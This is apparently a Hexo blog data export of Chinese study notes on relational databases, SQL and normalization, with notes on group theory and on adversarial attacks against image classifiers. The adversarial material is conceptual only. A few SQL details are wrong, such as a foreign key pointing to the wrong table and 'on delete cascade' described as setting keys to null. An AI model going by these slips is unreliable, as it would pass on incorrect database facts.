{"meta":{"title":"corona's Blog","subtitle":"","description":"","author":"coronaPolvo","url":"http://example.com","root":"/"},"pages":[{"title":"player","date":"2021-04-04T11:52:09.998Z","updated":"2020-12-06T03:03:06.997Z","comments":true,"path":"player/index.html","permalink":"http://example.com/player/index.html","excerpt":"","text":"console.error(\"Error: [hexo-tag-aplayer] Meting support is disabled, cannot resolve the meting tags properly.\");"},{"title":"categories","date":"2020-11-16T12:44:23.239Z","updated":"2020-10-29T03:27:45.646Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-04-04T11:52:09.998Z","updated":"2020-10-29T03:28:43.873Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-11-16T12:44:23.238Z","updated":"2020-10-29T03:28:23.733Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"【English】词根词缀","slug":"【English】词根词缀","date":"2021-04-19T23:44:13.000Z","updated":"2021-04-19T23:44:13.828Z","comments":true,"path":"2021/04/20/【English】词根词缀/","link":"","permalink":"http://example.com/2021/04/20/%E3%80%90English%E3%80%91%E8%AF%8D%E6%A0%B9%E8%AF%8D%E7%BC%80/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Database Review","slug":"Database-Review","date":"2021-04-11T07:29:27.000Z","updated":"2021-04-30T01:44:06.326Z","comments":true,"path":"2021/04/11/Database-Review/","link":"","permalink":"http://example.com/2021/04/11/Database-Review/","excerpt":"DataBase Review ¶关系代数 选择： σF(R)\\sigma_{F}(R)σF​(R) SELECT * FROM R WHERE F 投影：∏A(R)\\prod_{A}(R)∏A​(R) SELECT R FROM A ¶\u001c连接： ¶笛卡尔积： 现在有两个表如下： 12345678910111213141516171819mysql&gt; select * from S;+------+------+| A | B |+------+------+| 1 | 2 || 3 | 3 || 5 | 9 |+------+------+3 rows in set (0.00 sec)mysql&gt; select * from R;+------+------+| B | C |+------+------+| 2 | 1 || 7 | 2 || 3 | 5 |+------+------+3 rows in set (0.00 sec) 进行笛卡尔积操作后为： 123456789101112131415mysql&gt; select * from S,R;+------+------+------+------+| A | B | B | C |+------+------+------+------+| 1 | 2 | 2 | 1 || 3 | 3 | 2 | 1 || 5 | 9 | 2 | 1 || 1 | 2 | 7 | 2 || 3 | 3 | 7 | 2 || 5 | 9 | 7 | 2 || 1 | 2 | 3 | 5 || 3 | 3 | 3 | 5 || 5 | 9 | 3 | 5 |+------+------+------+------+9 rows in set (0.00 sec) 笛卡尔积的连接会对两个表的每一列进行排列组合","text":"DataBase Review ¶关系代数 选择： σF(R)\\sigma_{F}(R)σF​(R) SELECT * FROM R WHERE F 投影：∏A(R)\\prod_{A}(R)∏A​(R) SELECT R FROM A ¶\u001c连接： ¶笛卡尔积： 现在有两个表如下： 12345678910111213141516171819mysql&gt; select * from S;+------+------+| A | B |+------+------+| 1 | 2 || 3 | 3 || 5 | 9 |+------+------+3 rows in set (0.00 sec)mysql&gt; select * from R;+------+------+| B | C |+------+------+| 2 | 1 || 7 | 2 || 3 | 5 |+------+------+3 rows in set (0.00 sec) 进行笛卡尔积操作后为： 123456789101112131415mysql&gt; select * from S,R;+------+------+------+------+| A | B | B | C |+------+------+------+------+| 1 | 2 | 2 | 1 || 3 | 3 | 2 | 1 || 5 | 9 | 2 | 1 || 1 | 2 | 7 | 2 || 3 | 3 | 7 | 2 || 5 | 9 | 7 | 2 || 1 | 2 | 3 | 5 || 3 | 3 | 3 | 5 || 5 | 9 | 3 | 5 |+------+------+------+------+9 rows in set (0.00 sec) 笛卡尔积的连接会对两个表的每一列进行排列组合 ¶等值连接 θ\\thetaθ 为“＝” 的连接运算称为等值连接。它是从关系R与S的笛卡尔积中选取A、B属性值相等的那些元组。即等值连接为： ¶自然连接 自然连接（Natural join）是一种特殊的等值连接，它要求两个关系中进行比较的分量必须是相同的属性组，并且要在结果中把重复的属性去掉。即若R和S具有相同的属性组B，则自然连接可记作： ¶外连接 ¶左连接 在自然连接的基础上补上左集合中没有的列。没有对应值的项补null ¶右连接 在自然连接的基础上补上右集合中没有的列。没有对应值的项补null 外连接就是左连接和右连接的组合。 ¶除法 去看： https://www.jianshu.com/p/d80dbaef637e 讲的好啊 还有：https://blog.csdn.net/qq_35361859/article/details/105027905 也不错 ¶SQL语句的一些高级操作 ¶WHERE 123456789# between andselect * from my_auto where age between 20 and 22;# inselect * from my_auto where age in (20,30);# like or not likeselect * from my_auto where age like &#39;Li%&#39; # 以Li开头的学生select * from my_auto where age like &#39;Li_&#39; # 代替任何一个字符 总结 where 子句的目的是通过条件匹配进行数据的筛选，数据筛选的原理是在数据表（磁盘）进行； where中可以通过多种运算符来实现数据匹配：比较，逻辑，空运算，匹配运算； 在使用多种运算符的时候，需要考虑运算符的优先级； ¶DISTINCT Distinct 去重针对的是所有查出来的字段数据，记录相同则去重，而不是某一个字段值重复； 1select distinct * from my_student; ¶GROUP BY 语法：where 后 gourp by class_name 1select class_name from my_student group by class_name Group by 分组原理 按照分组字段，将获取到的记录分为几块 保留每块的第一条记录 group by 的目的： 实现分组统计，分组统计主要要用到一下的聚类函数 count(*/字段名)： 统计分组字段对应的记录数量 max(字段名)：统计分组后某个字段的最大值 max(字段名)：统计分组后某个字段的最小值 avg(字段名)：统计分组后某个字段的平均值 sum(字段名)：统计分组后某个字段的和 ¶HAVING 子句 定义：where是从磁盘读取数据时进行判断，而在数据进入内存之后where就不能生效了，HAVING是完全针对进入内存后的数据进行判定。 HAVING 语法： HAVING几乎能做所有WHERE能做的事情：HAVING条件判断 1select * from my_student having id &#x3D; 1; having主要针对group by后的统计结果进行判断 比如: 统计班级人数大于1的班级 1select count(*) number,class_name,group_concat(name) from my_student group by class_name having number &gt; 1; 注意： having 子句中用到的字段，必须在select后出现过，即字段从磁盘读入到内存当中。 having 条件判断中可以直接使用聚类函数 上面语句也可以替换为： 1select count(*) , class_name,group_concat(name) from my_student group by class_name having count(*) &gt; 1; ¶ORDER BY 子句 定义：order by即通过某个字段，使得表对应的校对集实现升序或者降序排序。 order by语法： order by 字段 [ASC][DESC] ; 其中ASC是升序，DESC为降序 1select * from my_student order by age; ¶EXISTS EXISTS的子查询不反回任何的数据，只会产生逻辑真值 true/flase 语法： 查询所有选修了1号课程的学生姓名 123select snamefrom Studentwhere exists(select * from sc,Student where sc.sno &#x3D; Student.sno); EXISTS还可以表示关系代数中的除法操作： 比如：查询至少选修了学号为‘200215121’选修的全部课程的学生号码 关系代数为： πsno,cno(SC)÷πcno(σ′200215121′(SC))\\pi_{sno,cno}(SC) \\div \\pi_{cno}(\\sigma_{&#x27;200215121&#x27;}(SC)) πsno,cno​(SC)÷πcno​(σ′200215121′​(SC)) SQL语句为： 可以理解为for循环嵌套 123456789SELECT DISTINCT snoFROM SC SCXWHERE NOT EXISTS (SELECT * FROM SC SCY WHERE SCY.sno&#x3D;&#39;201215122&#39; AND NOT EXISTS (SELECT * FROM SC SCZ WHERE SCZ.sno&#x3D;SCX.sno AND SCZ.cno&#x3D;SCY.cno)); ¶视图 ¶定义视图 语法： CREATE VIEW &lt;视图名&gt; [&lt;列名&gt;, &lt;列名&gt;, …] AS &lt;子查询&gt; [WITH CHECK OPTION] 其中子查询可以是任意的SELECT语句，是否可以含有ORDER BY子句和DISTINCT短语，则取决于具体系统的实现； WITH CHECK OPTION 作用：在对视图进行插入修改和删除时，关系数据库管理系统会自动记上select中的条件； 例如：建立信息系学生的视图，并要求进行修改和插入操作时仍然需要保证该视图有信息系的学生； 123456CREATE VIEW IS_StudentAS SELECT Sno,Sname,Sage FROM StudentWHERE Sdept&#x3D;&#39;IS&#39;WITH CHECK OPTION; 带有聚焦函数的语句 例如： 将学生的学号和平均成绩定义为一个视图； 12345CREATE VIEW S_G(Sno,Savg)ASSELECT Sno,AVG(Grade)FROM SCGROUP BY Sno; ¶删除视图 语法：DROP VIEW [CASCADE] CASCADE级联删除语句把视图和由他导出的所有视图一起删除了； ¶查询和更新视图 视图建立完之后就可以对视图像数据库一样进行查询和更新啦。 ¶视图的作用： 视图能够简化用户的操作 视图是用户能以多种角度看待同一数据 视图对重构数据库提供了一定程度的逻辑独立性 视图能够对机密数据提供安全保护 适当利用视图可以更加清晰地对表达查询 ¶数据库的安全性 ¶授权：授予和收回 GRANT GRANT语句的一般格式为： 1234GRANT &lt;权限&gt;[，&lt;权限&gt;]ON &lt;对象类型&gt;&lt;对象名&gt;[,&lt;对象类型&gt;&lt;对象名&gt;]TO &lt;用户&gt;[,&lt;用户&gt;][WITH GRANT OPTION] 接受授权的用户可以是一个或者多个具体用户，也可以PUBLIC，即全体用户。 如果是所有权限则可以使用ALL PRIVILEGES 如果指定了WITH GRANT OPTION子句，则获得某种权限的用户还可以把这种权限再授权其他的用户。没有的用户则不能传播该权限。 例如： 1234567891011-- 把查询Student表的权限授权给用户U1GRANT SELECT ON TABLE Student TO U1;-- 把对Student和Course表的全部操作权限授予用户U2和U3GRANT ALL PRIVILEGES ON TABLE Student,Course TO U2,U3;-- 把对表SC的查询权限授予所有用户并允许将该权限进行传播GRANT Select ON TABLE SC TO PUBLIC WITH GRANT OPTION;-- 每个学生具有查询SC表中自己信息的权限GRANT Select ON SC WHEN USER()&#x3D;Sname TO PUBLIC; REVOKE REVOKE 语句的意义是从某个角色/角色组那里收回权限 123REVOKE &lt;权限&gt;[，&lt;权限&gt;]ON &lt;对象类型&gt;&lt;对象名&gt;[,&lt;对象类型&gt;&lt;对象名&gt;]FROM &lt;用户&gt;[,&lt;用户&gt;] ¶视图机制 通过为不同的用户定义不同的视图，把数据对象限制在一定的范围内。也就是说通过视图机制把要保密的数据对无权存取对用户隐藏起来，从而自动对数据提供一定程度的安全保护。 例如：将视图CS_Student的SELECT权限授予U1 123GRANT SELECTON CS_StudentTO U1; ¶外键约束 定义：外间FOREIGN KEY，指在一张表中有一个字段指向另一个表的主键字段，并且通过外键关联会有一些约束效果 思考：在学习表关系的时候，在一对多或者多对多的时候，都会在一张表中增加一个字段来指向另一个表的主键，但是此时其实指向没有任何的实际含义，需要人为的去记住，这样有啥意义呢？ 引入：如果只是需要人为的去记住对应的关系，没有任何数据库本身去控制的话，那样的存在没有价值。外键就是负责这样的一个作用啦。 ¶外键 定义：外键就是在设定呢字段属于其他表的主键后，使用FOREIGN KEY关键字让表字段与另外表的主键产生内在关联关系。 创建表的使用 FOREIGN KEY (Cno) REFERENCES Course(Cno) 【标准SQL语句】 12345678CREATE TABLE SC(Sno CHAR(9) NOT NULL, Cno CHAR(4) NOT NULL, Grade SMALLINT, PRIMARY KEY (Sno,Cno), FOREIGN KEY(Sno) REFERENCES Student(Sno), FOREIGN KEY(Cno) REFERENCES Student(Cno)); ¶外键约束 定义：外键约束，即外键的增加之后对应的父表和子表都有相应的约束关系 外键增加后默认字段插入的数据对应的外键字段必须在浮标存在，否则会报错 外键增加后默认父表主键如果在外键值有使用，那么不能更新主键值，也不能删除主键所有记录 外键的作用： 限定子表（外键所在表）不能插入主表中不存在的外键值（不能更新） 限定父表（主键被引用）不能删除或者更新子表有外键引用的主键信息 可以在创建外键的之后制定外键的约束效果：即控制父表的操作对子表的影响 控制情况 on update：父表更新与子表有关联的主键时 on delete：父表删除与子表有关联的主键时 控制效果 cascade：级联操作，即父表怎么样，子表有对应关系的记录就怎么样 set null：置空操作，即父表变化，子表关联的记录对应的外键字段置空（注意：能够使用的前提是外键对应的字段允许空） restrict/no action：严格模式，即不允许父表操作 通常的搭配如下： on update cascade: 父表更新，子表级联更新 on delete cascade: 父表删除，子表对应外键置空 总结 外键约束分为父表的约束和对子表的约束，其中子表的约束是固定的不能插入父表不存在的外键值 父表外键约束可以通过设定on update和on delete事件来控制，控制方式有cascade，set null和restrict三种 外键的强大约束作用可以保证数据的完整性和有效性 外键的强大约束有可能操作负面影响：数据维护变的困难，所以实际开发中需要根据需求选择使用 外键总有InnoDB存储引擎支持，Mylsam不支持 ¶用户定义的完整性 定义：用户定义的完整性就是针对某一个具体应用的数据必须满足语义要求。 属性上的约束条件 在创建表时可以给表中的一些字段规定一些属性： 列值非空（NOT NULL） 列值唯一（UNIQUE） 检查列值是否满足一个条件表达式（CHECK 短语） 1234CREATE TABLE SC(Sno CHAR(9) NOT NULL, Cno CHAR(9) UNIQUE, GRADE NUMBER CHECK(GRADE BETWEEN 0 AND 100); 元组上的约束 与属性上的约束条件定义类似，不过元组级的限制可以设置不同属性之间的取值互为约束条件。 语法： CHECK(…) 12345678910CREATE TABLE Student( Sno CHAR(9), Sname CHAR(8) NOT NULL, Ssex CHAR(2), Sage SMALLINT, Sdept CHAR(20), PRIMARY KEY(Sno), CHECK(Ssex&#x3D;&#39;女&#39; OR Sname NOT LIKE &#39;Ms.%&#39;)); 当往表中插入援助否则修改属性的时候，关系数据库关系系统会自动检查元组上的约束条件时候被满足，如果不满足则操作被拒绝执行。 ¶完整性约束命名子句 SQL 在 CREATE TABLE语句中提供了完整性约束命名子句CONSTRAINT，用来对完整性约束条件命名，从而可以灵活地增加、删除一个完整性约束条件。 完整性约束命名子句 语法：CONSTRAINT &lt;完整性约束条件名&gt;&lt;完整性约束条件&gt; 123456CREATE TABLE Student( Sno NUMBERIC(6) CONSTRAINT C1 CHECK(Sno BETWEEN 90000 AND 99999), ...) 修改表中的完整性限制 可以使用ALTER TABLE 语句修改表中的完整性限制 12ALTER TABLE Student DROP CONSTRAINT C1; ¶范式 ¶几个函数依赖 设R(U)是属性集U上的关系模式，X，Y是U的子集。若对于R(U)的任意一个可能的关系r，r中不可能存在两个元组在X上的属性值相等，而在Y上的属性值不等，则称X函数确定Y或Y函数依赖于X，记住X-&gt;Y 部分函数依赖： 设X,Y是关系R的两个属性集合，存在X→Y，若X’是X的真子集，存在X’→Y，则称Y部分函数依赖于X。 例子：学生基本信息表R中（学号，身份证号，姓名）当然学号属性取值是唯一的，在R关系中，（学号，身份证号）-&gt;（姓名），（学号）-&gt;（姓名），（身份证号）-&gt;（姓名）；所以姓名部分函数依赖于（学号，身份证号）； 完全函数依赖： 设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。 =例子：学生基本信息表R（学号，班级，姓名）假设不同的班级学号有相同的，班级内学号不能相同，在R关系中，（学号，班级）-&gt;（姓名），但是（学号）-&gt;(姓名)不成立，（班级）-&gt;(姓名)不成立，所以姓名完全函数依赖与（学号，班级); 传递函数依赖： 设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z，则称Z传递函数依赖于X。 例子：在关系R(学号 ,宿舍, 费用)中，(学号)-&gt;(宿舍),宿舍！=学号，(宿舍)-&gt;(费用),费用!=宿舍，所以符合传递函数的要求；即费用传递函数依赖于学号 ¶属性集的函数依赖 就是将所有的可以推导出来的函数依赖关系全部给加进去，需要注意的就是有一个和空集的关系 剩下的就是对各个元素闭包的排列组合；比如上面的例题中 (A)+_++​ = ABC, 所以他就对应了如图的ABC的所有排列组合情况再加一个对空集对关系。 ¶码 ¶候选码的概念 这样一个集合，他可以推出所有的属性，但是他的任意一个真子集无法退出所有的属性。 . ¶如何求候选码？ 只出现在左边的一定是候选码中的元素 只出现在右边的一定不是候选码中的元素 左右都出现的不一定 左右都不出现的一定是候选码中的元素 在确定了可能出现的元素之后就可以使用闭包运算进行测试：如果组合可以推出所有的属性话就说明是候选码。 , 如果三个一组推不出来的话，就再加变成4个一组 1闭包：BD的闭包 是指由BD能推出来的所有属性 主属性： 候选码中的属性都是主属性 ¶第一范式 定义：第一范式，在设计表存储数据的时候，如果表中设计的字段存储的数据，在取出来使用之前还需要额外的处理（拆分）就不符合1NF，第一范式就是处理数据颗粒度大的问题 1.案例:设计一张学生选修课成绩表 学生 性别 课程 教室 成绩 学习时间 张三 男 PHP 101 100 2月1日,2月28日 李四 女 Java 102 90 3月1日,3月31日 张三 男 Java 102 95 3月1日,3月31日 2.以上表设计是一种非常常见的数据,但是如果想要知道学生上课的开始时间和结束时间,那就意味着这个学习时间取出之后需要再进行拆分,因此就不符合1NF。要保证数据取出来就可以直接使用,就需要将学习时间进行拆分。 学生 性别 课程 教室 成绩 开始时间 结束时间 张三 男 PHP 101 100 2月1日 2月28日 李四 女 Java 102 90 3月1日 3月31日 张三 男 Java 102 95 3月1日 3月31日 总结： 要满足1NF就是要保证数据在实际使用的时候不用对字段数据进行二次拆分 1DF的核心就行数据要有原子性（不可拆分） ¶第二范式 以上数据表的设计中满足了原子性，但是学生在某个课程中应该只有一个考试成绩，也就是说学生对应的课程的成绩应该是有唯一性的，那么以上数据表应该如何进行设计呢？ 引入：要解决以上问题，其实很简单就是学生姓名和课程名字应该说唯一的，那么只要增加一个复合主键即可。 定义： 第二范式（2NF），在数据表的设计过程中如果有复合主键（多字段主键），且表中有字段且并不是由整个主键来确定，而是依赖主键中的某个字段（主键的部分）：存在字段依赖主键的部分的问题，称之为部分依赖：第二范式就是要解决表设计中非主属性对主属性的部分依赖。 以上表中性别有学生决定，而不受到课程影响；同时教室由课程决定，而不受到学生影响。此时形成了字段部分依赖部分主键的情况，因此会存在部分依赖问题，也就不满足第二范式。 解决方案：就是让字段不会存储依赖部分主键的问题，因此需要做的就是增加一个逻辑主键字段：性别依赖学生但学生不是主键，教室依赖课程也不是主键。 以上虽然解决了依赖问题，但是学生和课程又不具有唯一性了，所以应该增加符合唯一键：unique(学生，课程) 总结： 第二范式就是解决字段部分依赖主键的问题，也就是部分字段依赖的问题 思考： 上述表虽然满足了1NF和2NF，但是总感觉怪怪的，理论上讲性别逻辑主键除外，实际业务主键还是学生和课程，这个表应该是学生与课程对应的成绩，为什么会出现性别和教室呢？ 引入：之所以会出现上述矛盾，原因就是我们将数据都揉到了一张表里面，而且出现了性别依赖学生，而学生依赖ID，形成了字段性别依赖非主键字段学分的问题，也就是触法了3NF的问题。 ¶第三范式 定义：第三范式（3NF），理论上讲，应该一张表中的所有字段都应该直接依赖主键（逻辑主键：代表的是业务主键），如果表设计中存在这样一个字段，并不直接依赖主键，而是通过某一个非主键字段依赖，最终实现依赖主键：把这种不是直接依赖主键，而是依赖主键非主键字段的依赖关系称之为传递依赖。第三范式就是要解决传递的问题。 第三范式的解决方案：如果某一个表中有字段依赖非主键字段，而被依赖字段依赖主键，我们就应该将这种非主键依赖关系进行分离，单独形成一张表。 学生表： 课程表： 此时，虽然性别依然依赖姓名而不是Stu_id, 教室依赖课程而不是Class_id, 那是因为Stu_id和Class_id代表逻辑主键，而不是实际的业务主键，学生表的实际主键应该是姓名，课程表的实际主键应该是课程 新学生选修课成绩表的设计，应该就是去的对应学生表和课程表的ID 总结 第三范式是不允许传递依赖：即有字段依赖非主键字段； 消除传递依赖的方案就是将相关数据对应创建一张表； ¶第三范式的模式分解 求出第三范式对应函数集的最小函数依赖 Fm，使用左部相同合并原则： Fm中左边相同的合并成一个数据表 例1：U=(A,B,C,D,E,G) F={BG-&gt;C，BD-&gt;E，DG-&gt;C，ADG-&gt;BC，AG-&gt;B，B-&gt;D} 若R不是3NF，将R分解为无损且保持函数依赖的3NF。 很简单可以求出候选键为AG 求最小函数依赖 (BG)+(BG)^+(BG)+ = {BCDEG} G在其中，删除 (BD)+(BD)^+(BD)+ = {BD} , E不在其中，保留 (DG)+(DG)^+(DG)+ = {DG}, C不在其中，保留 (ADG)+(ADG)^+(ADG)+ = {ABCDG}, B在其中，C也在其中，删除 (AG)+(AG)^+(AG)+ = {AG}, B不在其中，保留 (B)+(B)^+(B)+ = {B} , D不在其中保留 可以得到：F = {BD-&gt;E, DG-&gt;C, AG-&gt;B, B-&gt;D} 接下来判断一下左边有没有冗余； BD-&gt;E: (B+)(B^+)(B+)=BD, D 在里面，所以D有冗余 (D+)=D(D^+)=D(D+)=D, B不在里面所以B没有冗余 所以用B-&gt;E 替换，BD-&gt;E 同理可以得到Fm = {B-&gt;E, DG-&gt;C, AG-&gt;B, B-&gt;D} 根据左部相同原则进行合并 根据左部相同原则可以得到： R1 = BED, R2 = CDG, R3 = ABG . 因为AG已经在R3中了所以得到的分解是无损分解 ¶BCNF范式 在3NF的基础上如果所有的函数依赖的左边都是超码，那这个关系就满足第三范式；如果有一个不是超码就不满足； 超码： 一个码的闭包如果就是这个集合，那这个码就叫做超码 ¶BCNF范式的模式分解 … ¶Armstrong 公理系统 设U为属性集总体，F是U上的一组函数依赖，于是又关系模式R&lt;U,F&gt;，对于R&lt;U,F&gt;来说有以下的推理规则 由上面的三个公理我们可以得到： ¶最小函数依赖集 F中的每一个依赖，都不可以被其他的依赖推出，且右边一定是单元素 如何求最小依赖集？ Step1： 把右边的元素拆分成单个的 Step2： 对所有的依赖意义排查，找出多余的 . 排查A-&gt;B： 把A-&gt;B去掉,那么F=(B-&gt;A, B-&gt;C,A-&gt;C, C-&gt;A) 且(A)_+ = AC,不包含B,所以排除嫌疑,保留 排查B-&gt;A：把B-&gt;A去掉,那么F={A-&gt;B,A-&gt;C,C-&gt;A} 且(B)_+=BCA,包含A,就是嫌疑人,剔除 … 注：由于排查的顺序不一样可能会造成最小依赖集的不同 ¶模式分解 ¶无损分解 分解之后可以自然连接结合起来 . ¶保持函数依赖 保持函数依赖就是F分解之后还能够还原回来 考题：如何把数据库分解成3NF，并保持无损分解和函数依赖 Step1： 求出最小函数依赖集 Step2：把不在F中的属性全部找出来，单独分出一类，并从这些属性中删除 Step3：把每个依赖左边相同的分成一类 Step4：如果候选码没有出现在分类中，把任意一个候选码作为一类 . 例：U=(A,B,C,D,E) F={AB-&gt;C，C-&gt;B，D-&gt;E，D-&gt;C} 若R不是3NF，将R分解为无损且保持函数依赖的3NF。 解：易求得，码是AD，属于1NF 第一步：U1=ABC U2=BC U3=DCE 第二步： 将R分解为ρ={ R1({A,B,C}，{AB-&gt;C})， R2({B,C}，{C-&gt;B})， R3({D,E}，{D-&gt;E,D-&gt;C}) } 合并吸收： ρ={ R1({A,B,C}，{AB-&gt;C,C-&gt;B})， R2({D,E}，{D-&gt;E,D-&gt;C}) } 第三步：不是无损连接，添加码。 R3({A,D}，{∅}) 所以ρ={ R1({A,B,C}，{AB-&gt;C,C-&gt;B})， R2({D,E}，{D-&gt;E,D-&gt;C}), R3({A,D}，{∅}) } ¶数据库设计 ¶ER图转关系模式 去看： https://blog.csdn.net/Flora_SM/article/details/84645752 这里讲的非常好！","categories":[],"tags":[]},{"title":"DP Learning","slug":"DP-Learning","date":"2021-03-20T14:40:01.000Z","updated":"2021-03-20T14:44:45.650Z","comments":true,"path":"2021/03/20/DP-Learning/","link":"","permalink":"http://example.com/2021/03/20/DP-Learning/","excerpt":"","text":"¶闫氏DP分析法","categories":[],"tags":[]},{"title":"【论文阅读】Real World Adversarial attack ...","slug":"【论文阅读】Real-World-Adversarial-attack","date":"2021-02-04T11:00:51.000Z","updated":"2021-02-04T14:00:27.888Z","comments":true,"path":"2021/02/04/【论文阅读】Real-World-Adversarial-attack/","link":"","permalink":"http://example.com/2021/02/04/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91Real-World-Adversarial-attack/","excerpt":"Making an Invisibility Cloak: Real World Adversarial Attacks on Object Detectors propose a new loss function to produce patch;Print the patch on the cloth. People who wear this cloth can not be detected by object detectors in the real world Paper url: https://arxiv.org/abs/1810.05206","text":"Making an Invisibility Cloak: Real World Adversarial Attacks on Object Detectors propose a new loss function to produce patch;Print the patch on the cloth. People who wear this cloth can not be detected by object detectors in the real world Paper url: https://arxiv.org/abs/1810.05206","categories":[],"tags":[{"name":"神经对抗攻击","slug":"神经对抗攻击","permalink":"http://example.com/tags/%E7%A5%9E%E7%BB%8F%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"}]},{"title":"【信息安全数学基础】 群","slug":"【信息安全数学基础】-群","date":"2021-01-30T05:21:39.000Z","updated":"2021-01-30T06:31:43.511Z","comments":true,"path":"2021/01/30/【信息安全数学基础】-群/","link":"","permalink":"http://example.com/2021/01/30/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E3%80%91-%E7%BE%A4/","excerpt":"","text":"第六章 群 ¶群的定义 设三元组(G, ,1)中G为集合,・为集G上的二元运算,1为G中一个元。 若(G,1)满足: G1(乘法结合律):a・(b・c)=(a・b)・c,a,b,c∈G G2(単位元):1・a=a・1=a,a∈G G3(逆元):对a∈G,有a’∈G使得a・a=a’:a=1 则称G1)为群,简称群G,1称为群G的单位元,d’称为a的逆元。 若(G, ,1)还满足G4(交换律):a・b=b・a,a,b∈G,则称G为交换群。 若(G, ,1)仅满足G1,G2,则称G为有单位元的半群。 若(G, ,1)满足G1,G2,G4,则称G为有单位元的交换半群。 例(希尔密码) 在希尔密码( Hill Cipher)中加密变换为： (y1y2…ym)=(x1x2……xm)M mod 26(y_1y_2…y_m)=(x_1x_2……x_m) M\\ mod\\ 26 (y1​y2​…ym​)=(x1​x2​……xm​)M mod 26 这里密钥M∈GLm(Z26),xi,yi∈Z26,Z26={0,1,⋯ ,25}M \\in G L_{m}\\left(Z_{26}\\right), x_{i}, y_{i} \\in Z_{26}, Z_{26}=\\{0,1, \\cdots, 25\\}M∈GLm​(Z26​),xi​,yi​∈Z26​,Z26​={0,1,⋯,25},xix_ixi​为明 文,yiy_iyi​为密文。 字母AB・Z分别对应0,1,25,加密前先将明文字母串变换为Z26上的数字串,然后再按上述表达式每次m个数字的将明文数字串变换为密文数字串,最后将密文数字串变换为密文字母串。 ¶子群 定义：设(G, ,1)为群,A为G的子集合。若1∈A且(A, ,1)构成群,则 称A为G的子群,并记为A&lt;G。 如何证明是不是子群？ 例：证明nZ={0,士m,士2n…}为整数群(Z,+,0)的子群。 证: 证明是不是子集合：nZ⊆Zn Z \\subseteq ZnZ⊆Z 0∈A 证明(nZ,+,0)为一个群 ¶循环群 定义：若群G的每一个元都能表成一个元素a的方幂,则G称为由a生成的循环 群,记作G=&lt;a&gt;,a称为循环群G的生成元。 根据元素的阶的性质,循环群G=&lt;a&gt;共有两种类型: 当生成元a是无限阶元素时,则G称为无限阶循环群。 如果a的阶为n,即an=1,那么这时G=&lt;a&gt;=&lt;1,a,a2,a&quot;-l&gt;,则G称为由a所生成的m阶循 环群,注意此时1,a,2,…,an-两两不同。","categories":[],"tags":[]},{"title":"神经对抗攻击综述论文","slug":"【论文阅读】神经对抗攻击综述论文","date":"2021-01-20T01:40:53.000Z","updated":"2021-01-26T10:06:23.921Z","comments":true,"path":"2021/01/20/【论文阅读】神经对抗攻击综述论文/","link":"","permalink":"http://example.com/2021/01/20/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91%E7%A5%9E%E7%BB%8F%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E7%BB%BC%E8%BF%B0%E8%AE%BA%E6%96%87/","excerpt":"神经对抗攻击综述论文：Threat of Adversarial Attacks on Deep Learning in Computer Vision: A Survey 论文地址：https://arxiv.org/abs/1801.00553 这是一篇神经对抗的综述文章，非常非常非常详细的介绍了当前神经对抗攻击的发展情况和已有的攻击和防御算法。本篇博客主要对文章进行翻译，还加入了个人对一些算法的理解与解释。这篇文章我大概看了一个星期。真的是一篇非常不错的综述论文。 最近的研究表明，它们很容易受到对抗性攻击，因为输入的细微扰动会导致模型预测不正确的输出。 对于图像来说，这样的扰动往往太小而难以察觉，但它们完全欺骗了深度学习模型 ¶Inroduction 尽管深度学习以非凡的准确性执行各种各样的计算机视觉任务，Szegedy等人[22]首先发现了深度神经网络在图像分类背景下的一个有趣的弱点。他们发现，尽管现代深度网络的准确性很高，但却令人惊讶地容易受到对抗性攻击，这种攻击的形式是对人类视觉系统(几乎)察觉不到的图像的微小干扰。 即使是3d打印现实世界的物体也可以欺骗深度神经网络分类器 在第2节中，我们首先用计算机视觉的说法描述了与对抗性攻击有关的常见术语。在第3节，我们回顾了对抗性攻击任务的图像分类和超越。一个单独的部分是奉献给处理对抗攻击的方法在现实世界的条件。第4节将审查这些方法。在文献中，也有主要分析对抗性攻击存在性的著作。我们将在第5节讨论这些贡献。防御对手攻击的方法是","text":"神经对抗攻击综述论文：Threat of Adversarial Attacks on Deep Learning in Computer Vision: A Survey 论文地址：https://arxiv.org/abs/1801.00553 这是一篇神经对抗的综述文章，非常非常非常详细的介绍了当前神经对抗攻击的发展情况和已有的攻击和防御算法。本篇博客主要对文章进行翻译，还加入了个人对一些算法的理解与解释。这篇文章我大概看了一个星期。真的是一篇非常不错的综述论文。 最近的研究表明，它们很容易受到对抗性攻击，因为输入的细微扰动会导致模型预测不正确的输出。 对于图像来说，这样的扰动往往太小而难以察觉，但它们完全欺骗了深度学习模型 ¶Inroduction 尽管深度学习以非凡的准确性执行各种各样的计算机视觉任务，Szegedy等人[22]首先发现了深度神经网络在图像分类背景下的一个有趣的弱点。他们发现，尽管现代深度网络的准确性很高，但却令人惊讶地容易受到对抗性攻击，这种攻击的形式是对人类视觉系统(几乎)察觉不到的图像的微小干扰。 即使是3d打印现实世界的物体也可以欺骗深度神经网络分类器 在第2节中，我们首先用计算机视觉的说法描述了与对抗性攻击有关的常见术语。在第3节，我们回顾了对抗性攻击任务的图像分类和超越。一个单独的部分是奉献给处理对抗攻击的方法在现实世界的条件。第4节将审查这些方法。在文献中，也有主要分析对抗性攻击存在性的著作。我们将在第5节讨论这些贡献。防御对手攻击的方法是 ¶在adversarial attack中的常用术语 Adversarial example/image ：被故意扰乱的干净图像的修改版本. Threat model ：指一种方法所考虑的潜在攻击类型，例如黑盒攻击. Universal perturbation : 可以大概率干扰任何一张图片识别结果的干扰 White-box attacks 